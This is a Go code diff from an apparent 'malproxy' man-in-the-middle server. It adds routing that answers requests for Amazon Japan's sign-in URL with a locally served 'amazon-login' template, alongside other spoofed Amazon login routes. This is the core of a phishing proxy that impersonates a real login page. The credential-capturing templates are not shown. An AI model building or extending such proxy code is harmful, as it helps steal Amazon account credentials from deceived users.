@@ -5,6 +5,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"strings"
 	"text/template"
 
 	"github.com/go-malproxy/server/service"
@@ -50,7 +51,7 @@ func Server() {
 	http.HandleFunc("/hello", HelloHandler)
 	http.HandleFunc("/google", GoogleHandler)
 	http.HandleFunc("/amazon-login", AmazonLoginHandler)
-	http.HandleFunc("/amazon-login-password", AmazonLoginPasswordHandler)
+	http.HandleFunc("/amazon", AmazonHandler)
 	http.HandleFunc("/template", TemplateHandler)
 
 	http.ListenAndServe(":3333", nil)
@@ -68,7 +69,8 @@ func AmazonLoginHandler(w http.ResponseWriter, r *http.Request) { // http://loca
 	executor.ExecuteTemplate(w, "amazon-login", nil)
 }
 
-func AmazonLoginPasswordHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/amazon-login-password
+func AmazonHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/amazon-login-password
+	fmt.Println("method:", r.Method)
 	executor.ExecuteTemplate(w, "amazon-login-password", nil)
 }
 
@@ -93,9 +95,15 @@ func GoogleHandler(w http.ResponseWriter, r *http.Request) { // http://localhost
 func TemplateHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/template?url=http://mitm.es3/amazon.co.jp
 	fmt.Println("\x1b[31mURL:\x1b[0m", r.FormValue("url")) //取得したパラメータの表示
 	url := r.FormValue("url")
-	res, err := service.MainOperation(url)
-	if err != nil {
-		log.Fatal(err)
+	if strings.Contains(url, "https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age"){
+		fmt.Println("Amazonログイン")
+		executor.ExecuteTemplate(w, "amazon-login", nil)
+	}else{
+		fmt.Println("メイン操作")
+		res, err := service.MainOperation(url)
+	    if err != nil {
+		    log.Fatal(err)
+	    }
+	    executor.ExecuteTemplate(w, res, nil)
 	}
-	executor.ExecuteTemplate(w, res, nil)
 }
